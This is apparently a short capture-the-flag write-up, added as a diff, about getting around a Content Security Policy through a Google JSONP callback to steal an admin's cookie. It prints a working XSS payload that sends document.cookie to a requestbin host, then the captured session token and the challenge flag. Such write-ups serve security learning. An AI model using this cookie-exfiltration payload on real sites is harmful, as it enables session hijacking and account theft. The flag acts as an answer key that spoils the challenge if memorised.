@@ -1,0 +1,24 @@
+how to solve this challenge:
+we have to retrieve the admin's cookie.
+In order to do this, we need to use a requestbin to collect what is sent through a script.
+
+Policy: 
+    default-src 'self'; script-src 'self' *.google.com; connect-src *
+
+Since the site utilizes CSP, we bypass it with a script, found in this web page:
+https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt
+
+Since it works, I select this one:
+"><script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
+and obviously I have to modify it
+
+I take the address of my requestbin and I use the following script:
+"><script src="https://accounts.google.com/o/oauth2/revoke?callback={url = 'https://en1jkcvw2a4pg2w.m.pipedream.net/'; url_completo = url.concat(document.cookie); window.open(url_completo)}"></script>
+
+obviously, when I use it, it doesn't give anything since we don't have cookies, but when I click on the "Report to admin" button, the requestbin gets
+a request that shows its cookies!
+that are:
+https://en1jkcvw2a4pg2w.m.pipedream.net/session=eyJ1dWlkIjp7IiBiIjoiWW05MGRYTmxjZz09In19.YcMJ8Q.4WLsJGiCRbUoS3B_bZ37Dx7rtNM;%20flag=flag%7B4re_yo0_s0_sure_csp_1s_useful?}
+
+so, the flag is:
+flag{4re_yo0_s0_sure_csp_1s_useful?}
